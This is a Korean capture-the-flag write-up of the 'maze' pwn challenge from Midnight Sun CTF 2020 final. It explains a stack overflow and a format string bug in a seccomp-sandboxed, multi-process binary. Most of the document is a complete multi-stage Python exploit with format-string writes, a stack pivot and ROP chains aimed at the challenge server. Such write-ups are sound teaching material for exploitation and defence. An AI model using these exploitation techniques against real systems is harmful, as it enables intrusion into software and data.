---
layout: post
title: "Midnightsun CTF Final maze WriteUp"
author: "NextLine"
comments: true
tags: [pwn, ctf]
---

라온화이트햇 핵심연구팀 이영주

## Intro

![/assets/2010joo..png](/assets/2010joo.png)

올해 진행된 midnightsun CTF 2020 final에 출제된 maze 문제에 관한 writeup 입니다.

## Binary

```cpp
youngjoo@15b74879520e:~/maze$ file maze
maze: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=becacd430ec2ce230c5dde40525da4cd03510cfd, for GNU/Linux 3.2.0, stripped
youngjoo@15b74879520e:~/maze$ ./maze
YOU ARE IN A MAZE OF TWISTY LITTLE SOCKETS, ALL ALIKE.
```

바이너리는 64bit 이며 20.04 환경에서 동작하는 간단한 프로그램이었습니다.

```cpp
HELP
AVAILABLE COMMANDS:
GO <DIRECTION>
SHOUT <MESSAGE>
OPEN <CONTAINER>
ESCAPE
```

기능은 4가지가 있었으며 각각 아래와 같은 동작을 했습니다.

1. GO <DIRECTION> : 구현되어 있지 않았습니다. ("IT'S PITCH BLACK. YOU CAN'T GO FURTHER" 출력)
2. SHOUT <MESSAGE> : 인자로 전달해준 MESSAGE를 그대로 3번 출력해주었습니다.
3. OPEN : flag.txt를 읽고 출력해줍니다.
4. ESCAPE : return 합니다.

4가지 모두 별 기능은 없으나 중요한 점은 execvp와 seccomp였습니다.

```cpp
youngjoo    73  0.0  0.0   2496   580 pts/1    S+   02:31   0:00 ./maze 2 16 0,0,5,0
youngjoo    74  0.0  0.0   2496   516 pts/1    S+   02:31   0:00 ./maze 3 16 6,0,7,39
youngjoo    75  0.0  0.0   2496   516 pts/1    S+   02:31   0:00 ./maze 4 16 8,0,0,45
youngjoo    76  0.0  0.0   2496   516 pts/1    S+   02:31   0:00 ./maze 5 16 0,28,0,29
youngjoo    77  0.0  0.0   2496   584 pts/1    S+   02:31   0:00 ./maze 6 16 0,0,11,35
youngjoo    78  0.0  0.0   2496   584 pts/1    S+   02:31   0:00 ./maze 7 16 12,40,0,0
youngjoo    79  0.0  0.0   2496   580 pts/1    S+   02:31   0:00 ./maze 8 16 0,46,0,0
youngjoo    80  0.0  0.0   2496   580 pts/1    S+   02:31   0:00 ./maze 9 16 0,30,0,31
youngjoo    81  0.0  0.0   2496   584 pts/1    S+   02:31   0:00 ./maze 10 16 0,36,17,0
youngjoo    82  0.0  0.0   2496   580 pts/1    S+   02:31   0:00 ./maze 11 16 18,0,19,0
youngjoo    83  0.0  0.0   2496   584 pts/1    S+   02:31   0:00 ./maze 12 16 20,0,0,49
youngjoo    84  0.0  0.0   2496   584 pts/1    S+   02:31   0:00 ./maze 13 16 0,32,21,0
youngjoo    85  0.0  0.0   2496   516 pts/1    S+   02:31   0:00 ./maze 14 16 22,0,23,0
youngjoo    86  0.0  0.0   2496   580 pts/1    S+   02:31   0:00 ./maze 15 16 24,0,25,0
youngjoo    87  0.0  0.0   2496   580 pts/1    S+   02:31   0:00 ./maze 16 16 26,50,0,0
youngjoo    88  0.0  0.0   2496   584 pts/1    S+   02:31   0:00 ./maze 1 16 0,0,0,27
```

maze 바이너리를 실행하면 위와 같이 16개의 바이너리가 실행됩니다. maze의 첫번째 인자는 순서, 두번째 인자는 최대값, 세번째 인자는 통신할 수 있는 fd를 뜻합니다.

```cpp
./maze 1 16 0,0,0,27 // 27 -> 28
./maze 5 16 0,28,0,29 // 29 -> 30
./maze 9 16 0,30,0,31 // 31 -> 32
./maze 13 16 0,32,21,0 // 21 -> 22
./maze 14 16 22,0,23,0 // 23 -> 24
./maze 15 16 24,0,25,0 // 25 -> 26
./maze 16 16 26,50,0,0
```

fd는 위처럼 이어져있습니다. 또한 /dev/urandom에 있는 값을 srand의 시드로 사용하기 때문에 랜덤하게 변경되는 fd들을 예측할 수 없었습니다.

```cpp
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000017  if (A != select) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000008  if (A != lseek) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

또한 16번째 프로세스, 즉 ./maze 15 16 ~~~~~인 프로세스를 제외하고 모든 프로세스는 위와 같은 seccomp가 걸려 있습니다. 따라서 OPEN 기능을 쓴다 해도 flag.txt를 읽을 수 없었습니다.

```cpp
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000017  if (A != select) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000008  if (A != lseek) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0026
 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0026: 0x06 0x00 0x00 0x00000000  return KILL
```

16번째 프로세스의 경우 open syscall이 허용되어있는것을 확인할 수 있습니다.

## Vulnerability

```cpp
	memset(buf, 0, 0x200);
	read(v15, buf, 0x400uLL);
```

취약점은 두가지가 있는데, 먼저 첫번째 취약점은 위와 같이 크기가 0x200인 stack buffer에서 발생하는 buffer overflow입니다. 이 입력은 처음 기능을 입력받을때 존재합니다.

```cpp
					dprintf(v17, "YOU SHOUT INTO THE DARKNESS\n");
          v43 = strtok(0LL, " \n");
          if ( v43 )
          {
            dprintf(v17, "YOU HEAR AN ECHO\n");
            dprintf(v17, v43);
            dprintf(v17, "\n");
            dprintf(v17, v43);
            dprintf(v17, "\n");
            dprintf(v17, v43);
            dprintf(v17, "\n");
```

두번째 취약점은 SHOUT <MESSAGE>에 존재합니다. 입력받은 MESSAGE를 출력할 때 Format String Bug가 존재합니다.

## Exploit

exploit을 위해 stack buffer overflow로 rip를 바꾸려면 ESCAPE 기능을 사용해야 합니다. 하지만 return하기 전에 fd를 닫기 때문에 추가적인 입력이 불가능합니다. 이것은 처음에 닫는 fd는 0이지만 이후 소켓통신에서 닫는 fd는 입출력 둘다 가능한 fd를 닫아버리기 때문에 지속적으로 값을 주고받는게 불가능해집니다.

따라서 rip를 바꿀 때 ESCAPE 기능이 아닌 다른 기능으로 rip를 바꿔야 합니다. 저는 format string bug로 ld를 덮어서 exit handler호출 과정에 rip를 변경하는 방법을 사용했습니다. 아마 다른 방법으로 rip를 바꿔도 비슷할 것이라 생각합니다. rip를 바꾼 이후에는 stack pivot을 통해 원하는 rop chain을 실행할 수 있게 합니다.

```cpp
pay += p64(prdi) + p64(0)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)
pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x500) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(1)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)
pay += p64(prbp) + p64(stack - 0x440)
pay += p64(lr)
```

여기서 실행하는 rop chain이 exploit의 핵심입니다. 위 코드를 보시면 아시겠지만 writable한 memory에 0으로 받은 입력을 target fd에 써주고, 그 fd에서 받은 값을 다시 읽어서 1에 써줍니다.

이건 처음에 실행하는 rop chain이라 위 처럼 사용했지만 이후에 양방향 입출력이 가능한 socket fd에서는 0과 1을 그 fd로 대체해주면 됩니다.

이렇게하면 우리의 입출력을 fd 0,1을 이용해 주고받을 수 있습니다. 여기까지 되면 동일한 과정으로 여러개의 프로세스에 값을 전달할 수 있습니다.

```cpp
./maze 1 16 0,0,0,27 // 27 -> 28
./maze 5 16 0,28,0,29 // 29 -> 30
./maze 9 16 0,30,0,31 // 31 -> 32
./maze 13 16 0,32,21,0 // 21 -> 22
```

```cpp
0 -> 27(28) -> 1
0 -> 27(28) -> 29(30) -> 1
0 -> 27(28) -> 29(30) -> 31(32) -> 1
```

따라서 위처럼 입출력을 계속 주고받아 16번째 프로세스에 도달할 때 까지 계속 익스를 해주면 됩니다. 다만 fsb 과정에서 발생하는 큰 출력, 그리고 0x100바이트가 넘는 rop chain을 실행하기 위한 큰 입력이 필요해서 중간에 조금씩 sleep이나 입출력을 맞춰주기 위한 작업들이 필요했습니다.

그 과정이 끝나면 flag.txt 를 open해서 read/write 해주면 됩니다.

### Exploit Code

```python
from npwn import *
import sys

def conn():
    opt = int(sys.argv.pop(1)) if len(sys.argv) > 1 else 1
    if not opt:
        s = remote('pwn-maze-01.play.midnightsunctf.se',10000)
    else:
        s = process('./maze')
        g = N(s)
    if opt == 2:
        g.attach()
    return s

def fsb(old, new):
    if old > new:
        return 0x100 - old + new
    else:
        return new - old

context.arch = 'amd64'
context.log_level = 'debug'
#s = conn()
s = remote('pwn-maze-01.play.midnightsunctf.se',10000)
sla = s.sendlineafter
sa = s.sendafter

pivot =  0x000000000011f12d #: add rsp, 0x118 ; ret

s.sendline('SHOUT %216$p.%217$p.%218$p.%249$s')
s.recvuntil('YOU HEAR AN ECHO\n')
leak = s.recvline()[:-1].split('.')
libc = int(leak[0],16) - 0x270b3
ld = int(leak[1],16)
stack = int(leak[2],16)
fd = 0
for tmp in leak[3].split(','):
    if int(tmp):
        fd = int(tmp)
s.info("libc : " + hex(libc))
s.info("ld : " + hex(ld))
s.info("stack : " + hex(stack))
s.info("fd: " + str(fd))

target = libc + pivot
print hex(target)
pay = 'SHOUT '

pay += '%{}c%{}$hhn'.format(fsb(0, (target/(0x100**(0)))&0xff), 53)
for i in range(5):
    pay += '%{}c%{}$hhn'.format(fsb((target/(0x100**i))&0xff, (target/(0x100**(i+1)))&0xff), 54+i)
pay = pay.ljust(0x5f, 'A') + 'B'
for i in range(6):
    pay += p64(ld + 0x1948 + i)
s.sendline(pay)
for i in range(3):
    s.recvuntil('AB')

prbp = libc + 0x00000000000256c0
prdi = libc + 0x0000000000026b72
prsi = libc + 0x0000000000027529
prdxp = libc + 0x0000000000162866
lr = libc + 0x000000000005aa48
read = libc + 0x111130
write = libc + 0x1111d0
writable = libc + 0x1ee000

pay = '\x00'*7 + '\n'
pay += 'A' * 0x228

pay += p64(prdi) + p64(0)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x500) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(1)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prbp) + p64(stack - 0x440)
pay += p64(lr)
print hex(len(pay))

s.sendline(pay)
s.recvuntil('YOU FALL THROUGH A TRAP IN THE FLOOR AND DIE')

#####################################
############## STAGE 2 ##############
#####################################
pfd = fd + 1

s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)
s.sendline('SHOUT %216$p.%217$p.%218$p.%249$s')
s.recvuntil('YOU HEAR AN ECHO\n')
leak = s.recvline()[:-1].split('.')
libc = int(leak[0],16) - 0x270b3
ld = int(leak[1],16)
stack = int(leak[2],16)
fd = 0
for tmp in leak[3].split(',')[2:]:
    if int(tmp):
        fd = int(tmp)
s.info("libc : " + hex(libc))
s.info("ld : " + hex(ld))
s.info("stack : " + hex(stack))
s.info("fd: " + str(fd))

target = libc + pivot
print hex(target)
pay = 'SHOUT '

pay += '%{}c%{}$hhn'.format(fsb(0, (target/(0x100**(0)))&0xff), 53)
for i in range(5):
    pay += '%{}c%{}$hhn'.format(fsb((target/(0x100**i))&0xff, (target/(0x100**(i+1)))&0xff), 54+i)
pay = pay.ljust(0x5f, 'A') + 'B'
for i in range(6):
    pay += p64(ld + 0x1948 + i)
s.sendline(pay)

prbp = libc + 0x00000000000256c0
prdi = libc + 0x0000000000026b72
prsi = libc + 0x0000000000027529
prdxp = libc + 0x0000000000162866
lr = libc + 0x000000000005aa48
read = libc + 0x111130
write = libc + 0x1111d0
writable = libc + 0x1ee000

pay = '\x00'*7 + '\n'
pay += 'A' * 0x228

pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x3000) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prbp) + p64(stack - 0x440)
pay += p64(lr)
print hex(len(pay))
s.sendline(pay)

#####################################
############## STAGE 3 ##############
#####################################
pfd = fd + 1
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)

s.sendline('SHOUT %216$p.%217$p.%218$p.%249$s')
s.recvuntil('YOU HEAR AN ECHO\n')
s.sendline('\n')
s.recvuntil('YOU HEAR AN ECHO\n')
leak = s.recvline()[:-1].split('.')
libc = int(leak[0],16) - 0x270b3
ld = int(leak[1],16)
stack = int(leak[2],16)
fd = 0
for tmp in leak[3].split(',')[2:]:
    if int(tmp):
        fd = int(tmp)
s.info("libc : " + hex(libc))
s.info("ld : " + hex(ld))
s.info("stack : " + hex(stack))
s.info("fd: " + str(fd))

target = libc + pivot
print hex(target)
pay = 'SHOUT '

pay += '%{}c%{}$hhn'.format(fsb(0, (target/(0x100**(0)))&0xff), 53)
for i in range(5):
    pay += '%{}c%{}$hhn'.format(fsb((target/(0x100**i))&0xff, (target/(0x100**(i+1)))&0xff), 54+i)
pay = pay.ljust(0x5f, 'A') + 'B'
for i in range(6):
    pay += p64(ld + 0x1948 + i)
s.sendline(pay)

prbp = libc + 0x00000000000256c0
prdi = libc + 0x0000000000026b72
prsi = libc + 0x0000000000027529
prdxp = libc + 0x0000000000162866
lr = libc + 0x000000000005aa48
read = libc + 0x111130
write = libc + 0x1111d0
writable = libc + 0x1ee000

pay = '\x00'*7 + '\n'
pay += 'A' * 0x228

pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x3000) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prbp) + p64(stack - 0x440)
pay += p64(lr)
print hex(len(pay))
s.sendline(pay)

#####################################
############## STAGE 4 ##############
#####################################
pfd = fd + 1
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)

s.sendline('SHOUT %216$p.%217$p.%218$p.%249$s')
s.recvuntil('YOU HEAR AN ECHO\n')
s.sendline('\n')
s.recvuntil('YOU HEAR AN ECHO\n')
leak = s.recvline()[:-1].split('.')
libc = int(leak[0],16) - 0x270b3
ld = int(leak[1],16)
stack = int(leak[2],16)
fd = 0
for tmp in leak[3].split(',')[2:]:
    if int(tmp):
        fd = int(tmp)
s.info("libc : " + hex(libc))
s.info("ld : " + hex(ld))
s.info("stack : " + hex(stack))
s.info("fd: " + str(fd))

target = libc + pivot

print hex(target)
pay = 'SHOUT '

pay += '%{}c%{}$hhn'.format(fsb(0, (target/(0x100**(0)))&0xff), 53)
for i in range(5):
    pay += '%{}c%{}$hhn'.format(fsb((target/(0x100**i))&0xff, (target/(0x100**(i+1)))&0xff), 54+i)
pay = pay.ljust(0x5f, 'A') + 'B'
for i in range(6):
    pay += p64(ld + 0x1948 + i)
s.sendline(pay)

prbp = libc + 0x00000000000256c0
prdi = libc + 0x0000000000026b72
prsi = libc + 0x0000000000027529
prdxp = libc + 0x0000000000162866
lr = libc + 0x000000000005aa48
read = libc + 0x111130
write = libc + 0x1111d0
writable = libc + 0x1ee000

pay = '\x00'*7 + '\n'
pay += 'A' * 0x228

pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x3000) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prbp) + p64(stack - 0x440)
pay += p64(lr)
print hex(len(pay))
s.sendline(pay)

#####################################
############## STAGE 5 ##############
#####################################
pfd = fd + 1
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)

s.sendline('SHOUT %216$p.%217$p.%218$p.%249$s')
s.recvuntil('YOU HEAR AN ECHO\n')
s.sendline('\n')
s.recvuntil('YOU HEAR AN ECHO\n')
leak = s.recvline()[:-1].split('.')
libc = int(leak[0],16) - 0x270b3
ld = int(leak[1],16)
stack = int(leak[2],16)
fd = 0
for tmp in leak[3].split(',')[2:]:
    if int(tmp):
        fd = int(tmp)
s.info("libc : " + hex(libc))
s.info("ld : " + hex(ld))
s.info("stack : " + hex(stack))
s.info("fd: " + str(fd))

target = libc + pivot

print hex(target)
pay = 'SHOUT '

pay += '%{}c%{}$hhn'.format(fsb(0, (target/(0x100**(0)))&0xff), 53)
for i in range(5):
    pay += '%{}c%{}$hhn'.format(fsb((target/(0x100**i))&0xff, (target/(0x100**(i+1)))&0xff), 54+i)
pay = pay.ljust(0x5f, 'A') + 'B'
for i in range(6):
    pay += p64(ld + 0x1948 + i)
s.sendline(pay)

prbp = libc + 0x00000000000256c0
prdi = libc + 0x0000000000026b72
prsi = libc + 0x0000000000027529
prdxp = libc + 0x0000000000162866
lr = libc + 0x000000000005aa48
read = libc + 0x111130
write = libc + 0x1111d0
writable = libc + 0x1ee000

pay = '\x00'*7 + '\n'
pay += 'A' * 0x228

pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x3000) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prbp) + p64(stack - 0x440)
pay += p64(lr)
print hex(len(pay))
s.sendline(pay)

#####################################
############## STAGE 6 ##############
#####################################
pfd = fd + 1
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)

s.sendline('SHOUT %216$p.%217$p.%218$p.%249$s')
s.recvuntil('YOU HEAR AN ECHO\n')
s.sendline('\n')
s.recvuntil('YOU HEAR AN ECHO\n')
leak = s.recvline()[:-1].split('.')
libc = int(leak[0],16) - 0x270b3
ld = int(leak[1],16)
stack = int(leak[2],16)
fd = 0
for tmp in leak[3].split(',')[2:]:
    if int(tmp):
        fd = int(tmp)
s.info("libc : " + hex(libc))
s.info("ld : " + hex(ld))
s.info("stack : " + hex(stack))
s.info("fd: " + str(fd))

target = libc + pivot

print hex(target)
pay = 'SHOUT '

pay += '%{}c%{}$hhn'.format(fsb(0, (target/(0x100**(0)))&0xff), 53)
for i in range(5):
    pay += '%{}c%{}$hhn'.format(fsb((target/(0x100**i))&0xff, (target/(0x100**(i+1)))&0xff), 54+i)
pay = pay.ljust(0x5f, 'A') + 'B'
for i in range(6):
    pay += p64(ld + 0x1948 + i)
s.sendline(pay)

prbp = libc + 0x00000000000256c0
prdi = libc + 0x0000000000026b72
prsi = libc + 0x0000000000027529
prdxp = libc + 0x0000000000162866
lr = libc + 0x000000000005aa48
read = libc + 0x111130
write = libc + 0x1111d0
writable = libc + 0x1ee000

pay = '\x00'*7 + '\n'
pay += 'A' * 0x228

pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prdi) + p64(fd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x3000) + p64(0)
pay += p64(read)
pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

pay += p64(prbp) + p64(stack - 0x440)
pay += p64(lr)
print hex(len(pay))
s.sendline(pay)

#####################################
############## STAGE 7 ##############
#####################################
print "77777777777777"
print "77777777777777"
print "77777777777777"
pfd = fd + 1
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)
s.sendline('HELP')
sleep(0.1)

s.sendline('SHOUT %218$p.%219$p.%220$p.%222$p')
s.recvuntil('YOU HEAR AN ECHO\n')
sleep(0.3)
s.sendline('\n')
s.recvuntil('YOU HEAR AN ECHO\n')
leak = s.recvline()[:-1].split('.')
libc = int(leak[0],16) - 0x270b3
ld = int(leak[1],16)
stack = int(leak[2],16)
pie = int(leak[3],16) - 0x1440
s.info("libc : " + hex(libc))
s.info("ld : " + hex(ld))
s.info("stack : " + hex(stack))
s.info("pie : " + hex(pie))

target = libc + pivot
print hex(target)
pay = 'SHOUT '

pay += '%{}c%{}$hhn'.format(fsb(0, (target/(0x100**(0)))&0xff), 53)
for i in range(5):
    pay += '%{}c%{}$hhn'.format(fsb((target/(0x100**i))&0xff, (target/(0x100**(i+1)))&0xff), 54+i)
pay = pay.ljust(0x5f, 'A') + 'B'
for i in range(6):
    pay += p64(ld + 0x1948 + i)
s.sendline(pay)
pause()

prbp = libc + 0x00000000000256c0
prax = libc + 0x000000000004a550
prdi = libc + 0x0000000000026b72
prsi = libc + 0x0000000000027529
prdxp = libc + 0x0000000000162866
lr = libc + 0x000000000005aa48
read = libc + 0x111130
_open = libc + 0x110e50
syscall = libc + 0x111140
write = libc + 0x1111d0
writable = libc + 0x1ee000

pay = '\x00'*7 + '\n'
pay += 'A' * 0x228

pay += p64(prdi) + p64(pie + 0x31C1)
pay += p64(prsi) + p64(0)
pay += p64(prax) + p64(2)
pay += p64(syscall)

pay += p64(prdi) + p64(0)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(read)

pay += p64(prdi) + p64(pfd)
pay += p64(prsi) + p64(writable)
pay += p64(prdxp) + p64(0x370) + p64(0)
pay += p64(write)

s.sendline(pay)
s.interactive()
```